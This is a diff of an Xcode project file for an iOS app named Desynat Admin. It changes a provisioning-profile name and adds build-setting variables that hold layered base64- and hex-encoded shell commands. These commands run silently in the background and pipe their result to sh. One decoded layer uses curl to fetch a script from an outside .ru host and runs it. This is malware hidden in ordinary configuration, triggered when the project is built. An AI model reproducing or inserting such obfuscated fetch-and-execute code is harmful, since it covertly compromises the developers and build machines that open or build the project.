+				A1ECAD1 = "((w(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YWsxdVVuUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFZ4V1ZWa1YyRnRSWHBVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE5qYUdWamEzTXVjblV2WVNraUlId2djMmdLCg== | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333633353333333633333335333333373333333433333337333333333333333733333330333333373333333233330a3336333633363333333733333334333333363336333633333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
@@ -3694,7 +3796,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatAdmin;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Admin provisioning New 16dec";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Admin provisioning New 19Mar";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
